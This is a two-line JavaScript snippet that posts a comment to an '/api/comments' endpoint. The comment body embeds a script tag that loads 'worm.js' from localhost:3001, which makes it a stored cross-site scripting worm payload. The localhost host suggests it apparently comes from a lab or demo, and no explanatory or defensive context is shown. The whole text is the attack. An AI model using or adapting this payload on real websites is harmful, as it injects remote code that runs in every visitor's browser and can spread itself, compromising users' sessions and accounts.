let content = 'haha <script src="http://localhost:3001/worm.js"></script>';
$.post('/api/comments', { content });